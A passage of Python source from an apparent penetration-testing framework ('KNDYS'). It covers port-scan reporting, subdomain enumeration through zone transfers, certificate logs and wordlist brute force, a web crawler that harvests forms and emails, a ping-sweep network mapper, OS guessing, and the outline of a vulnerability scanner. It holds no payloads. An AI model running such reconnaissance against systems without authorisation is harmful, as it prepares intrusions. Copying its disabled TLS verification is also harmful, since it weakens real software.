                        print(f"{Fore.BLUE}  └─ Version: {banner_info['version'][:60]}{Style.RESET_ALL}")
                    elif banner_info.get('service'):
                        print(f"{Fore.BLUE}  └─ Service: {banner_info['service'][:60]}{Style.RESET_ALL}")
                    
                    if vulns:
                        vulnerabilities.extend(vulns)
                        for vuln in vulns:
                            severity_color = Fore.MAGENTA if vuln['severity'] == 'CRITICAL' else Fore.RED
                            print(f"{severity_color}  ⚠ {vuln['type']}: {vuln['description']}{Style.RESET_ALL}")
        
        elapsed_time = time.time() - start_time
        
        # Summary
        print(f"\n{Fore.WHITE}{'═' * 70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Scan completed in {elapsed_time:.2f} seconds{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Total ports scanned: {len(ports)}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Open ports found: {len(open_ports)}{Style.RESET_ALL}")
        
        if vulnerabilities:
            print(f"{Fore.RED}[!] Vulnerabilities detected: {len(vulnerabilities)}{Style.RESET_ALL}")
        
        # Detailed summary
        if open_ports:
            print(f"\n{Fore.YELLOW}[*] Service Summary:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}{'─' * 70}{Style.RESET_ALL}")
            
            # Group by service
            services_grouped = {}
            for port in sorted(open_ports):
                service = scan_results[port]['service']
                if service not in services_grouped:
                    services_grouped[service] = []
                services_grouped[service].append(port)
            
            for service, ports_list in sorted(services_grouped.items()):
                ports_str = ', '.join(map(str, ports_list))
                print(f"{Fore.CYAN}  {service:20s} {Fore.WHITE}→ Ports: {ports_str}{Style.RESET_ALL}")
            
            # Export results
            self._export_port_scan_results(target, scan_results, elapsed_time)
        else:
            print(f"{Fore.YELLOW}[*] No open ports found{Style.RESET_ALL}")
    
    def get_service_name(self, port):
        """Get service name for common ports"""
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
            443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S',
            1433: 'MSSQL', 1521: 'Oracle', 2049: 'NFS', 3306: 'MySQL',
            3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
            8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt', 27017: 'MongoDB',
            11211: 'Memcached'
        }
        return services.get(port, 'Unknown')
    
    def get_service_name_extended(self, port):
        """Extended service database with 90+ services"""
        services = {
            # File Transfer
            20: 'FTP-DATA', 21: 'FTP', 22: 'SSH/SFTP', 69: 'TFTP', 989: 'FTPS-DATA', 990: 'FTPS',
            # Email
            25: 'SMTP', 110: 'POP3', 143: 'IMAP', 465: 'SMTPS', 587: 'SMTP-Submission',
            993: 'IMAPS', 995: 'POP3S',
            # Web
            80: 'HTTP', 443: 'HTTPS', 8000: 'HTTP-Alt', 8008: 'HTTP-Alt', 8080: 'HTTP-Proxy',
            8081: 'HTTP-Alt', 8088: 'HTTP-Alt', 8443: 'HTTPS-Alt', 8888: 'HTTP-Alt',
            # Databases
            1433: 'MSSQL', 1521: 'Oracle', 3306: 'MySQL', 5432: 'PostgreSQL', 5984: 'CouchDB',
            6379: 'Redis', 7000: 'Cassandra', 7001: 'Cassandra-JMX', 8529: 'ArangoDB',
            9042: 'Cassandra-CQL', 9200: 'Elasticsearch', 9300: 'Elasticsearch-Transport',
            27017: 'MongoDB', 27018: 'MongoDB-Shard', 28017: 'MongoDB-Web',
            # Remote Access
            23: 'Telnet', 3389: 'RDP', 5900: 'VNC', 5901: 'VNC-1', 5902: 'VNC-2',
            # Directory Services
            88: 'Kerberos', 389: 'LDAP', 636: 'LDAPS', 3268: 'Global-Catalog', 3269: 'Global-Catalog-SSL',
            # File Sharing
            137: 'NetBIOS-NS', 138: 'NetBIOS-DGM', 139: 'NetBIOS-SSN', 445: 'SMB/CIFS',
            2049: 'NFS', 2121: 'FTP-Proxy',
            # DNS
            53: 'DNS', 5353: 'mDNS',
            # Monitoring
            161: 'SNMP', 162: 'SNMP-Trap', 514: 'Syslog', 10000: 'Webmin', 19999: 'Netdata',
            # Proxy & Cache
            3128: 'Squid-Proxy', 8118: 'Privoxy', 11211: 'Memcached',
            # Containers & Orchestration
            2375: 'Docker', 2376: 'Docker-SSL', 2377: 'Docker-Swarm',
            6443: 'Kubernetes-API', 10250: 'Kubelet', 10251: 'Kube-Scheduler', 10252: 'Kube-Controller',
            # Message Queues
            4369: 'Erlang-Port-Mapper', 5672: 'AMQP', 15672: 'RabbitMQ-Management',
            # Version Control
            3000: 'Grafana/Gitea', 9000: 'SonarQube',
            # Game Servers
            25565: 'Minecraft', 27015: 'Source-Engine', 7777: 'Terraria',
            # Other
            111: 'RPCBind', 135: 'MS-RPC', 1723: 'PPTP', 5060: 'SIP', 5061: 'SIP-TLS',
        }
        return services.get(port, f'Unknown({port})')
    
    def _export_port_scan_results(self, target, results, elapsed_time):
        """Export scan results to JSON and TXT"""
        timestamp = int(time.time())
        
        # JSON Export
        json_data = {
            'target': target,
            'timestamp': timestamp,
            'scan_time': f'{elapsed_time:.2f}s',
            'open_ports': len(results),
            'results': {}
        }
        
        for port, data in results.items():
            json_data['results'][str(port)] = {
                'service': data['service'],
                'banner': data['banner'].get('version', '') or data['banner'].get('service', ''),
                'vulnerabilities': data['vulnerabilities']
            }
        
        json_file = f'portscan_{target}_{timestamp}.json'
        with open(json_file, 'w') as f:
            json.dump(json_data, f, indent=2)
        
        # TXT Export
        txt_file = f'portscan_{target}_{timestamp}.txt'
        with open(txt_file, 'w') as f:
            f.write("=" * 70 + "\n")
            f.write("PORT SCAN REPORT - KNDYS FRAMEWORK\n")
            f.write("=" * 70 + "\n\n")
            f.write(f"Target: {target}\n")
            f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))}\n")
            f.write(f"Duration: {elapsed_time:.2f} seconds\n")
            f.write(f"Open Ports: {len(results)}\n\n")
            f.write("=" * 70 + "\n")
            f.write("OPEN PORTS DETAILS\n")
            f.write("=" * 70 + "\n\n")
            
            for port in sorted(results.keys()):
                data = results[port]
                f.write(f"Port: {port}/TCP\n")
                f.write(f"Service: {data['service']}\n")
                if data['banner'].get('version'):
                    f.write(f"Version: {data['banner']['version']}\n")
                if data['vulnerabilities']:
                    f.write("Vulnerabilities:\n")
                    for vuln in data['vulnerabilities']:
                        f.write(f"  - [{vuln['severity']}] {vuln['type']}: {vuln['description']}\n")
                f.write("\n" + "-" * 70 + "\n\n")
        
        print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
        print(f"  • {json_file}")
        print(f"  • {txt_file}")
    
    def run_subdomain_scanner(self):
        """Professional subdomain enumeration with multiple techniques"""
        domain = self.module_options['domain']
        wordlist_file = self.module_options.get('wordlist', '')
        threads = int(self.module_options.get('threads', 20))
        techniques = self.module_options.get('techniques', 'all')
        verify_http = self.module_options.get('verify_http', 'true').lower() == 'true'
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║      PROFESSIONAL SUBDOMAIN SCANNER - KNDYS      ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.WHITE}Domain:{Style.RESET_ALL}     {Fore.CYAN}{domain}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Techniques:{Style.RESET_ALL} {Fore.CYAN}{techniques}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Threads:{Style.RESET_ALL}    {Fore.CYAN}{threads}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}HTTP Check:{Style.RESET_ALL} {Fore.CYAN}{verify_http}{Style.RESET_ALL}\n")
        
        start_time = time.time()
        found_subdomains = {}
        wildcard_ip = self._detect_wildcard_dns(domain)
        
        if wildcard_ip:
            print(f"{Fore.YELLOW}[!] Wildcard DNS detected: *.{domain} -> {wildcard_ip}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Results will be filtered to remove false positives{Style.RESET_ALL}\n")
        
        # Technique 1: DNS Zone Transfer
        if techniques == 'all' or 'axfr' in techniques:
            print(f"{Fore.BLUE}[1/5] Attempting DNS Zone Transfer (AXFR)...{Style.RESET_ALL}")
            axfr_results = self._try_zone_transfer(domain)
            if axfr_results:
                print(f"{Fore.GREEN}  [+] Zone transfer successful! Found {len(axfr_results)} records{Style.RESET_ALL}")
                for sub, ip in axfr_results.items():
                    if ip != wildcard_ip:
                        found_subdomains[sub] = {'ip': ip, 'source': 'AXFR'}
            else:
                print(f"{Fore.YELLOW}  [-] Zone transfer not allowed{Style.RESET_ALL}")
        
        # Technique 2: Certificate Transparency
        if techniques == 'all' or 'crt' in techniques:
            print(f"\n{Fore.BLUE}[2/5] Searching Certificate Transparency logs...{Style.RESET_ALL}")
            crt_results = self._search_crt_sh(domain)
            if crt_results:
                print(f"{Fore.GREEN}  [+] Found {len(crt_results)} subdomains from certificates{Style.RESET_ALL}")
                for sub in crt_results:
                    if sub not in found_subdomains:
                        try:
                            ip = socket.gethostbyname(sub)
                            if ip != wildcard_ip:
                                found_subdomains[sub] = {'ip': ip, 'source': 'CRT'}
                                print(f"{Fore.GREEN}    → {sub} [{ip}]{Style.RESET_ALL}")
                        except:
                            pass
        
        # Technique 3: DNS Brute Force
        if techniques == 'all' or 'brute' in techniques:
            print(f"\n{Fore.BLUE}[3/5] DNS Brute Force enumeration...{Style.RESET_ALL}")
            
            # Load wordlist
            wordlist = self._get_subdomain_wordlist(wordlist_file)
            print(f"{Fore.WHITE}  Wordlist size: {len(wordlist)} terms{Style.RESET_ALL}")
            
            brute_results = self._dns_brute_force(domain, wordlist, threads, wildcard_ip)
            if brute_results:
                print(f"{Fore.GREEN}  [+] Brute force found {len(brute_results)} subdomains{Style.RESET_ALL}")
                for sub, ip in brute_results.items():
                    if sub not in found_subdomains:
                        found_subdomains[sub] = {'ip': ip, 'source': 'BRUTE'}
        
        # Technique 4: Common Patterns
        if techniques == 'all' or 'patterns' in techniques:
            print(f"\n{Fore.BLUE}[4/5] Testing common patterns...{Style.RESET_ALL}")
            pattern_results = self._test_common_patterns(domain, wildcard_ip)
            if pattern_results:
                print(f"{Fore.GREEN}  [+] Found {len(pattern_results)} from patterns{Style.RESET_ALL}")
                for sub, ip in pattern_results.items():
                    if sub not in found_subdomains:
                        found_subdomains[sub] = {'ip': ip, 'source': 'PATTERN'}
        
        # Technique 5: HTTP/HTTPS Verification
        if verify_http and found_subdomains:
            print(f"\n{Fore.BLUE}[5/5] Verifying HTTP/HTTPS accessibility...{Style.RESET_ALL}")
            self._verify_http_access(found_subdomains, threads)
        
        elapsed_time = time.time() - start_time
        
        # Summary
        print(f"\n{Fore.WHITE}{'═' * 70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Scan completed in {elapsed_time:.2f} seconds{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Total subdomains found: {len(found_subdomains)}{Style.RESET_ALL}")
        
        if found_subdomains:
            # Group by source
            sources = {}
            for sub, data in found_subdomains.items():
                source = data['source']
                sources[source] = sources.get(source, 0) + 1
            
            print(f"\n{Fore.YELLOW}[*] Results by technique:{Style.RESET_ALL}")
            for source, count in sorted(sources.items()):
                print(f"{Fore.WHITE}  {source:10s}: {count} subdomains{Style.RESET_ALL}")
            
            # Display results
            print(f"\n{Fore.YELLOW}[*] Discovered subdomains:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}{'─' * 70}{Style.RESET_ALL}")
            for sub in sorted(found_subdomains.keys()):
                data = found_subdomains[sub]
                http_status = data.get('http_status', '')
                status_str = f" [{http_status}]" if http_status else ""
                print(f"{Fore.GREEN}  {sub:40s} {Fore.CYAN}{data['ip']:15s} {Fore.YELLOW}{status_str}{Style.RESET_ALL}")
            
            # Export results
            self._export_subdomain_results(domain, found_subdomains, elapsed_time)
        else:
            print(f"{Fore.YELLOW}[*] No subdomains found{Style.RESET_ALL}")
    
    def _detect_wildcard_dns(self, domain):
        """Detect wildcard DNS configuration"""
        random_sub = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=20))
        try:
            ip = socket.gethostbyname(f"{random_sub}.{domain}")
            return ip
        except:
            return None
    
    def _try_zone_transfer(self, domain):
        """Attempt DNS zone transfer"""
        results = {}
        try:
            ns_records = dns.resolver.resolve(domain, 'NS')
            for ns in ns_records:
                ns_server = str(ns)
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(ns_server, domain))
                    for name, node in zone.nodes.items():
                        subdomain = str(name) + '.' + domain if str(name) != '@' else domain
                        for rdataset in node.rdatasets:
                            if rdataset.rdtype == dns.rdatatype.A:
                                for rdata in rdataset:
                                    results[subdomain] = str(rdata)
                except:
                    pass
        except:
            pass
        return results
    
    def _search_crt_sh(self, domain):
        """Search Certificate Transparency logs via crt.sh"""
        subdomains = set()
        try:
            url = f"https://crt.sh/?q=%.{domain}&output=json"
            response = requests.get(url, timeout=30)
            if response.status_code == 200:
                data = response.json()
                for entry in data:
                    name_value = entry.get('name_value', '')
                    for sub in name_value.split('\n'):
                        sub = sub.strip()
                        if '*' not in sub and sub.endswith(domain):
                            subdomains.add(sub)
        except:
            pass
        return list(subdomains)
    
    def _get_subdomain_wordlist(self, wordlist_file):
        """Load or generate subdomain wordlist"""
        if wordlist_file and os.path.exists(wordlist_file):
            try:
                with open(wordlist_file, 'r') as f:
                    return [line.strip() for line in f if line.strip()]
            except:
                pass
        
        # Enhanced built-in wordlist (246 terms)
        return [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk', 'ns2',
            'cpanel', 'whm', 'autodiscover', 'autoconfig', 'test', 'dev', 'staging', 'prod', 'production',
            'api', 'admin', 'portal', 'remote', 'beta', 'mx', 'mx1', 'mx2', 'shop', 'blog', 'news',
            'www2', 'm', 'mobile', 'vpn', 'secure', 'support', 'cdn', 'static', 'images', 'img',
            'forum', 'forums', 'chat', 'wiki', 'help', 'status', 'monitoring', 'git', 'svn', 'backup',
            'old', 'new', 'demo', 'app', 'apps', 'store', 'download', 'downloads', 'web', 'server',
            'cloud', 'dashboard', 'console', 'panel', 'control', 'login', 'signin', 'register', 'signup',
            'sso', 'auth', 'account', 'accounts', 'profile', 'user', 'users', 'members', 'member',
            'client', 'clients', 'partner', 'partners', 'reseller', 'resellers', 'affiliate', 'affiliates',
            'corporate', 'corp', 'enterprise', 'ent', 'business', 'b2b', 'b2c', 'internal', 'intranet',
            'extranet', 'external', 'private', 'public', 'customer', 'customers', 'vendor', 'vendors',
            'payment', 'payments', 'billing', 'invoice', 'invoices', 'order', 'orders', 'cart', 'checkout',
            'cms', 'crm', 'erp', 'hr', 'finance', 'sales', 'marketing', 'analytics', 'stats', 'statistics',
            'reports', 'report', 'data', 'database', 'db', 'sql', 'mysql', 'postgres', 'mongo', 'redis',
            'cache', 'queue', 'mq', 'rabbitmq', 'kafka', 'elastic', 'elasticsearch', 'kibana', 'grafana',
            'prometheus', 'jenkins', 'gitlab', 'github', 'bitbucket', 'docker', 'kubernetes', 'k8s',
            'cluster', 'node', 'node1', 'node2', 'master', 'slave', 'primary', 'secondary', 'replica',
            'db1', 'db2', 'web1', 'web2', 'app1', 'app2', 'api1', 'api2', 'load-balancer', 'lb',
            'proxy', 'gateway', 'edge', 'cdn1', 'cdn2', 'media', 'video', 'streaming', 'live',
            'office', 'mail2', 'smtp2', 'pop3', 'imap', 'exchange', 'owa', 'outlook', 'webmail2',
            'calendar', 'contacts', 'docs', 'documents', 'files', 'share', 'sharing', 'drive',
            'vpn1', 'vpn2', 'tunnel', 'proxy1', 'proxy2', 'socks', 'tor', 'onion', 'i2p',
            'test1', 'test2', 'dev1', 'dev2', 'stage', 'stage1', 'stage2', 'uat', 'qa', 'preprod',
            'v1', 'v2', 'v3', 'version1', 'version2', 'release', 'latest', 'stable', 'alpha', 'gamma',
            'delta', 'next', 'future', 'preview', 'sandbox', 'lab', 'experiment', 'research'
        ]
    
    def _dns_brute_force(self, domain, wordlist, threads, wildcard_ip):
        """Perform DNS brute force with rate limiting"""
        results = {}
        
        def check_subdomain(sub):
            full_domain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(full_domain)
                if ip != wildcard_ip:
                    return full_domain, ip
            except:
                pass
            return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(check_subdomain, sub): sub for sub in wordlist}
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    subdomain, ip = result
                    results[subdomain] = ip
                    print(f"{Fore.GREEN}    → {subdomain} [{ip}]{Style.RESET_ALL}")
        
        return results
    
    def _test_common_patterns(self, domain, wildcard_ip):
        """Test common subdomain patterns"""
        results = {}
        patterns = [
            # VPN
            'vpn', 'vpn1', 'vpn2', 'ssl-vpn', 'remote',
            # Mail
            'mail', 'mail2', 'smtp', 'pop', 'imap', 'mx', 'mx1', 'mx2', 'webmail',
            # Remote Access
            'citrix', 'rdp', 'desktop', 'terminal', 'ts',
            # Corporate
            'intranet', 'extranet', 'internal', 'corp', 'corporate',
            # Common
            'www', 'ftp', 'api', 'dev', 'test', 'staging'
        ]
        
        for pattern in patterns:
            full_domain = f"{pattern}.{domain}"
            try:
                ip = socket.gethostbyname(full_domain)
                if ip != wildcard_ip:
                    results[full_domain] = ip
            except:
                pass
        
        return results
    
    def _verify_http_access(self, subdomains, threads):
        """Verify HTTP/HTTPS accessibility"""
        def check_http(subdomain, data):
            for protocol in ['https', 'http']:
                try:
                    url = f"{protocol}://{subdomain}"
                    response = requests.get(url, timeout=5, verify=False, allow_redirects=True)
                    data['http_status'] = f"{protocol.upper()} {response.status_code}"
                    if 'Server' in response.headers:
                        data['server'] = response.headers['Server']
                    return
                except:
                    pass
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(check_http, sub, data) for sub, data in subdomains.items()]
            concurrent.futures.wait(futures)
    
    def _export_subdomain_results(self, domain, results, elapsed_time):
        """Export subdomain scan results"""
        timestamp = int(time.time())
        
        # JSON Export
        json_data = {
            'domain': domain,
            'timestamp': timestamp,
            'scan_time': f'{elapsed_time:.2f}s',
            'total_subdomains': len(results),
            'subdomains': {}
        }
        
        for sub, data in results.items():
            json_data['subdomains'][sub] = {
                'ip': data['ip'],
                'source': data['source'],
                'http_status': data.get('http_status', ''),
                'server': data.get('server', '')
            }
        
        json_file = f'subdomains_{domain}_{timestamp}.json'
        with open(json_file, 'w') as f:
            json.dump(json_data, f, indent=2)
        
        # TXT Export
        txt_file = f'subdomains_{domain}_{timestamp}.txt'
        with open(txt_file, 'w') as f:
            f.write("=" * 70 + "\n")
            f.write("SUBDOMAIN ENUMERATION REPORT - KNDYS FRAMEWORK\n")
            f.write("=" * 70 + "\n\n")
            f.write(f"Domain: {domain}\n")
            f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))}\n")
            f.write(f"Duration: {elapsed_time:.2f} seconds\n")
            f.write(f"Subdomains Found: {len(results)}\n\n")
            f.write("=" * 70 + "\n")
            f.write("DISCOVERED SUBDOMAINS\n")
            f.write("=" * 70 + "\n\n")
            
            for sub in sorted(results.keys()):
                data = results[sub]
                f.write(f"Subdomain: {sub}\n")
                f.write(f"IP: {data['ip']}\n")
                f.write(f"Source: {data['source']}\n")
                if data.get('http_status'):
                    f.write(f"HTTP: {data['http_status']}\n")
                if data.get('server'):
                    f.write(f"Server: {data['server']}\n")
                f.write("\n" + "-" * 70 + "\n\n")
        
        print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
        print(f"  • {json_file}")
        print(f"  • {txt_file}")
    
    def run_web_crawler(self):
        """Advanced web crawler"""
        url = self.module_options['url']
        depth = int(self.module_options.get('depth', 3))
        threads = int(self.module_options.get('threads', 10))
        
        print(f"{Fore.CYAN}[*] Crawling {url} with depth {depth}{Style.RESET_ALL}")
        
        visited = set()
        to_visit = [(url, 0)]
        results = {
            'links': [],
            'forms': [],
            'files': [],
            'emails': [],
            'comments': []
        }
        
        def crawl(current_url, current_depth):
            if current_url in visited or current_depth > depth:
                return
            
            visited.add(current_url)
            print(f"{Fore.BLUE}[*] Crawling: {current_url}{Style.RESET_ALL}")
            
            try:
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(current_url, headers=headers, timeout=10, verify=False)
                
                if response.status_code == 200:
                    # Extract links
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urljoin(current_url, href)
                        if full_url not in visited:
                            to_visit.append((full_url, current_depth + 1))
                            results['links'].append(full_url)
                    
                    # Find forms
                    for form in soup.find_all('form'):
                        form_info = {
                            'action': form.get('action', ''),
                            'method': form.get('method', 'get').upper(),
                            'inputs': []
                        }
                        
                        for input_tag in form.find_all(['input', 'textarea', 'select']):
                            input_info = {
                                'name': input_tag.get('name', ''),
                                'type': input_tag.get('type', 'text'),
                                'value': input_tag.get('value', '')
                            }
                            form_info['inputs'].append(input_info)
                        
                        results['forms'].append(form_info)
                    
                    # Find emails
                    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
                    emails = re.findall(email_pattern, response.text)
                    results['emails'].extend(emails)
                    
                    # Find comments
                    comments = soup.find_all(string=lambda text: isinstance(text, str) and '<!--' in text)
                    results['comments'].extend(comments)
                    
            except Exception as e:
                print(f"{Fore.RED}[-] Error crawling {current_url}: {str(e)}{Style.RESET_ALL}")
        
        # Start crawling
        while to_visit:
            current_url, current_depth = to_visit.pop(0)
            crawl(current_url, current_depth)
            
            # Limit visited pages
            if len(visited) > 100:
                print(f"{Fore.YELLOW}[!] Reached limit of 100 pages{Style.RESET_ALL}")
                break
        
        print(f"\n{Fore.CYAN}[*] Crawling completed{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Found:{Style.RESET_ALL}")
        print(f"  - Links: {len(results['links'])}")
        print(f"  - Forms: {len(results['forms'])}")
        print(f"  - Emails: {len(set(results['emails']))}")
        print(f"  - Comments: {len(results['comments'])}")
        
        # Save results
        output_file = f"crawl_results_{int(time.time())}.json"
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2)
        print(f"{Fore.YELLOW}[*] Results saved to: {output_file}{Style.RESET_ALL}")
    
    def run_network_mapper(self):
        """Network discovery and mapping"""
        network = self.module_options['network']
        do_ping = self.module_options.get('ping', 'true').lower() == 'true'
        
        print(f"{Fore.CYAN}[*] Mapping network: {network}{Style.RESET_ALL}")
        
        try:
            net = ipaddress.ip_network(network, strict=False)
            live_hosts = []
            
            def ping_host(ip):
                if do_ping:
                    param = '-n' if os.name == 'nt' else '-c'
                    command = ['ping', param, '1', '-W', '1', str(ip)]
                    try:
                        output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        if output.returncode == 0:
                            return str(ip)
                    except:
                        pass
                return None
            
            print(f"{Fore.BLUE}[*] Scanning {net.num_addresses} addresses...{Style.RESET_ALL}")
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(ping_host, ip): ip for ip in net.hosts()}
                
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result:
                        live_hosts.append(result)
                        print(f"{Fore.GREEN}[+] Live host: {result}{Style.RESET_ALL}")
            
            print(f"\n{Fore.CYAN}[*] Network mapping completed{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Found {len(live_hosts)} live hosts{Style.RESET_ALL}")
            
            if live_hosts:
                print(f"\n{Fore.YELLOW}[*] Live hosts:{Style.RESET_ALL}")
                for host in live_hosts:
                    try:
                        hostname = socket.gethostbyaddr(host)[0]
                        print(f"  {host} -> {hostname}")
                    except:
                        print(f"  {host}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    def run_os_detection(self):
        """OS detection using TCP/IP fingerprinting"""
        target = self.module_options['target']
        
        print(f"{Fore.CYAN}[*] Detecting OS for {target}{Style.RESET_ALL}")
        
        # Simple TTL-based OS detection
        try:
            # Send ICMP ping
            param = '-n' if os.name == 'nt' else '-c'
            command = ['ping', param, '1', '-W', '2', target]
            output = subprocess.run(command, capture_output=True, text=True)
            
            if 'TTL=' in output.stdout or 'ttl=' in output.stdout.lower():
                # Extract TTL
                match = re.search(r'TTL=(\d+)', output.stdout.upper())
                if match:
                    ttl = int(match.group(1))
                    
                    # OS detection based on TTL
                    if ttl <= 64:
                        os_guess = "Linux/Unix"
                    elif ttl <= 128:
                        os_guess = "Windows"
                    elif ttl <= 255:
                        os_guess = "Cisco/Network Device"
                    else:
                        os_guess = "Unknown"
                    
                    print(f"{Fore.GREEN}[+] TTL: {ttl} -> Likely OS: {os_guess}{Style.RESET_ALL}")
                    
                    # Additional checks
                    try:
                        # Check common ports for more info
                        common_ports = [22, 3389, 445]
                        for port in common_ports:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(1)
                            if sock.connect_ex((target, port)) == 0:
                                service = self.get_service_name(port)
                                print(f"{Fore.YELLOW}[*] Port {port} open - {service}{Style.RESET_ALL}")
                            sock.close()
                    except:
                        pass
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
    
    # ============ SCAN MODULES ============
    
    def run_vuln_scanner(self):
        """Comprehensive vulnerability scanner with 33 checks in 7 categories"""
        target = self.module_options['target']
        scan_type = self.module_options.get('scan_type', 'full')
        threads = int(self.module_options.get('threads', '5'))
        aggressive = self.module_options.get('aggressive', 'false').lower() == 'true'
        stealth = self.module_options.get('stealth_mode', 'false').lower() == 'true'
        
        print(f"{Fore.CYAN}╔{'═'*70}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{' '*15}ADVANCED VULNERABILITY SCANNER - KNDYS v3.0{' '*12}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚{'═'*70}╝{Style.RESET_ALL}\n")
        print(f"{Fore.CYAN}[*] Target: {target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Scan Type: {scan_type.upper()}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Threads: {threads} | Aggressive: {aggressive} | Stealth: {stealth}{Style.RESET_ALL}\n")
        
        vulnerabilities = []
        start_time = time.time()
        
        # Define 33 checks organized in 7 categories
        categories = {
            'Injection': [
                ("SQL Injection (Error-based)", lambda: self._check_sql_error_based(target)),
                ("SQL Injection (Time-based)", lambda: self._check_sql_time_based(target)),
                ("NoSQL Injection", lambda: self._check_nosql_injection(target)),
                ("Command Injection", lambda: self._check_command_injection_advanced(target)),
                ("LDAP Injection", lambda: self._check_ldap_injection(target)),
            ],
            'XSS': [
                ("Reflected XSS", lambda: self._check_reflected_xss(target)),
                ("Stored XSS", lambda: self._check_stored_xss(target)),
                ("DOM-based XSS", lambda: self._check_dom_xss(target)),
            ],
            'Broken Authentication': [
                ("Weak Authentication", lambda: self._check_weak_auth(target)),
                ("Session Management", lambda: self._check_session_mgmt(target)),
                ("JWT Vulnerabilities", lambda: self._check_jwt_vulns(target)),
            ],
            'Sensitive Data': [
                ("SSL/TLS Configuration", lambda: self._check_ssl_config(target)),
                ("Sensitive Files Exposed", lambda: self._check_sensitive_files(target)),
                ("Information Disclosure", lambda: self._check_info_disclosure(target)),
                ("Security Headers", lambda: self._check_security_headers_advanced(target)),
            ],
            'XXE': [
                ("XML External Entity (XXE)", lambda: self._check_xxe_advanced(target)),
                ("DTD Injection", lambda: self._check_dtd_injection(target)),
            ],
            'Access Control': [
                ("IDOR Detection", lambda: self._check_idor(target)),
                ("Path Traversal", lambda: self._check_path_traversal_advanced(target)),
                ("Forced Browsing", lambda: self._check_forced_browsing(target)),
            ],
            'Security Misconfiguration': [
                ("CORS Misconfiguration", lambda: self._check_cors(target)),
                ("HTTP Methods", lambda: self._check_http_methods(target)),
                ("Default Credentials", lambda: self._check_default_creds(target)),
                ("Verbose Error Messages", lambda: self._check_verbose_errors(target)),
                ("Debug Mode", lambda: self._check_debug_mode(target)),
                ("CSRF Protection", lambda: self._check_csrf_advanced(target)),
                ("Clickjacking", lambda: self._check_clickjacking(target)),
                ("Open Redirect", lambda: self._check_open_redirect(target)),
                ("SSRF", lambda: self._check_ssrf_advanced(target)),
                ("Outdated JS Libraries", lambda: self._check_outdated_libs(target)),
                ("API Documentation Exposed", lambda: self._check_api_docs(target)),
                ("Backup Files Accessible", lambda: self._check_backup_files(target)),
                ("Host Header Injection", lambda: self._check_host_header_injection(target)),
            ],
        }
        
        # Apply scan type filter
        if scan_type == 'quick':
            # Only critical checks
            categories = {k: v[:2] for k, v in categories.items()}
        elif scan_type == 'web':
            # Focus on web-specific
            categories = {k: v for k, v in categories.items() if k in ['XSS', 'Injection', 'Security Misconfiguration']}
        elif scan_type == 'api':
            # Focus on API security
            categories = {k: v for k, v in categories.items() if k in ['Injection', 'Broken Authentication', 'Access Control']}
        
        # Execute checks by category
        check_count = 0
        total_checks = sum(len(checks) for checks in categories.values())
        
        for category, checks in categories.items():
            print(f"\n{Fore.CYAN}[*] Category: {category}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'─'*70}{Style.RESET_ALL}")
            
            for check_name, check_func in checks:
                check_count += 1
                print(f"{Fore.YELLOW}[{check_count}/{total_checks}] Checking: {check_name}...{Style.RESET_ALL}", end='\r')
                
                try:
                    result = check_func()
                    if result:
                        severity, details, remediation = result
                        vulnerabilities.append({
                            'category': category,
                            'name': check_name,
                            'severity': severity,
